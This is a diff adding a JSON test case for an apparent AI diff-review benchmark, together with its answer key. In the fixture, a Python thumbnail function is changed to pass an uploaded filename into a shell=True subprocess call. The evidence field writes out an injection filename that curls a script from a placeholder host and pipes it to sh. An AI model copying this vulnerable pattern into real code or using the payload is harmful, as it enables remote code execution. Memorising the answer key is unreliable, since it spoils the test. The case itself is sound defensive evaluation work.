@@ -1,0 +1,59 @@
+{
+  "id": "C005",
+  "title": "Thumbnail shell command interpolated with user filename",
+  "stack": "python",
+  "change_class": "injection",
+  "risk_class": "critical_positive",
+  "family_group": "G05",
+  "fixture": {
+    "kind": "trees",
+    "base": {
+      "thumbs.py": "import subprocess\n\ndef make_thumb(upload_dir: str, name: str, oid: str) -> None:\n    # name validated upstream by ALLOWED_FILES regex\n    subprocess.run(\n        [\"/usr/bin/convert\", f\"{upload_dir}/{name}\", f\"/srv/thumbs/{oid}.png\"],\n        check=True,\n    )\n"
+    },
+    "head": {
+      "thumbs.py": "import subprocess\n\ndef make_thumb(upload_dir: str, name: str, oid: str) -> None:\n    # shell form needed for the imagemagick policy delegate\n    subprocess.run(\n        f\"convert {upload_dir}/{name} /srv/thumbs/{oid}.png\",\n        shell=True,\n        check=True,\n    )\n"
+    },
+    "pr_metadata": {
+      "title": "Fix thumbnail conversion under IM7",
+      "body": "ImageMagick 7 needs the policy delegate; switch conversion to shell form.",
+      "deceptive": false
+    },
+    "revision_pin": "fixture:sha256:cdecaa8bbb5dd0c19c19aa767e04419ead6e568d3114365db8f2fd51a5da142d"
+  },
+  "labels": [
+    {
+      "id": "C005-d1",
+      "severity": "critical",
+      "path": "thumbs.py",
+      "defect": "Shell command injection: upload-controlled filename interpolated into a shell=True command",
+      "evidence": "Reproducible: upload name \"x; curl https://example.invalid/e.sh | sh; #\" makes the spawned shell run the fetched script as the service account; $(...) and backticks in name behave identically.",
+      "introduced_by_change": true,
+      "ambiguous": false,
+      "keywords": [
+        "shell=True",
+        "subprocess",
+        "convert",
+        "name"
+      ],
+      "window": 25
+    }
+  ],
+  "expected": {
+    "must_flag": [
+      "C005-d1"
+    ],
+    "must_not_flag": []
+  },
+  "adjudication": {
+    "status": "adjudicated",
+    "adjudicator": "independent-reviewer-v1",
+    "blind": true,
+    "verdict": "confirmed",
+    "notes": "shell=True with upload-controlled filename; upstream validation was written for exec-array form."
+  },
+  "rights": {
+    "origin": "original synthetic fixture authored for this corpus (repository MIT)",
+    "egress": "synthetic; no real secrets, hosts, or user data"
+  },
+  "schema": "ai-diff-reviewer/eval-case/1"
+}
